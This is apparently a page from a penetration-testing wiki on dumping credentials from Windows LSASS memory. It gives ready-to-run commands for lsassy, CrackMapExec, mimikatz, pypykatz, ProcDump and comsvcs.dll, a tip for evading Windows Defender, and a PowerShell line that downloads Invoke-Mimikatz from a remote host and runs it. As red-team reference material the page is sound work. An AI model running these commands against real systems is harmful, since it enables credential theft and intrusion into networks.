---
description: MITRE ATT&CK™ Sub-technique T1003.001
---

# LSASS secrets

## Theory

The Local Security Authority Subsystem Service (LSASS) is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens. Those operations lead to the storage of credential material in the process memory of LSASS. **With administrative rights only**, this material can be harvested (either locally or remotely).

## Practice

{% tabs %}
{% tab title="Lsassy" %}
[Lsassy](https://github.com/Hackndo/lsassy) (Python) can be used to remotely extract credentials, from LSASS, on multiple hosts. As of today (22/07/2020), it is the Rolls-Royce of remote lsass credential harvesting.

* several dumping methods: comsvcs.dll, [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [Dumpert](https://github.com/outflanknl/Dumpert)
* several authentication methods: like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos)
* it can be used either as a standalone script, as a [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) module or as a Python library
* it can interact with a Neo4j database to set [BloodHound](https://github.com/BloodHoundAD/BloodHound) targets as "owned"

```bash
# With pass-the-hash (NTLM)
lsassy -u $USER -H $NThash $TARGETS

# With plaintext credentials
lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS

# With pass-the-ticket (Kerberos)
lsassy -k $TARGETS

# CrackMapExec Module examples
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
crackmapexec smb $TARGETS -k -M lsassy
crackmapexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
```
{% endtab %}

{% tab title="Mimikatz" %}
[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally to extract credentials with [`sekurlsa::logonpasswords`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/logonpasswords) from lsass's process memory, or remotely with [`sekurlsa::minidump`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/minidump) to analyze a memory dump (dumped with [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) for example).

```bash
# (Locally) extract credentials from LSASS process memory
sekurlsa::logonpasswords

# (Remotely) analyze a memory dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

For Windows 2000, a special version of mimikatz called mimilove can be used.
{% endtab %}

{% tab title="Pypykatz" %}
[Pypykatz](https://github.com/skelsec/pypykatz) (Python) can be used remotely (i.e. offline) to analyze a memory dump (dumped with [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) for example).

```bash
pypykatz lsa minidump lsass.dmp
```
{% endtab %}

{% tab title="ProcDump" %}
The legitimate tool [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)) ([download](https://live.sysinternals.com/)) can be used to dump lsass's process memory.

```bash
procdump --accepteula -ma lsass lsass.dmp
```

{% hint style="info" %}
Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
{% endhint %}

```bash
# Find lsass's pid
tasklist /fi "imagename eq lsass.exe"

# Dump lsass's process memory
procdump -accepteula -ma $lsass_pid lsass.dmp
```

Once the memory dump is finished, it can be analyzed with [mimikatz](https://github.com/gentilkiwi/mimikatz) (Windows) or [pypykatz](https://github.com/skelsec/pypykatz) (Python, cross-platform).
{% endtab %}

{% tab title="comsvcs.dll" %}
The native comsvcs.dll DLL found in `C:\Windows\system32` can be used with rundll32 to dump LSASS's process memory.

```bash
# Find lsass's pid
tasklist /fi "imagename eq lsass.exe"

# Dump lsass's process memory
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
```
{% endtab %}

{% tab title="PowerSploit" %}
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s exfiltration script [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) (PowerShell) can be used to extract credential material from LSASS's process memory.

```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
{% endtab %}
{% endtabs %}

Recovered credential material could be either plaintext passwords or NT hash that can be used with [pass the hash](../../ntlm/pth.md) (depending on the context).

## References

{% embed url="https://en.hackndo.com/remote-lsass-dump-passwords/" %}
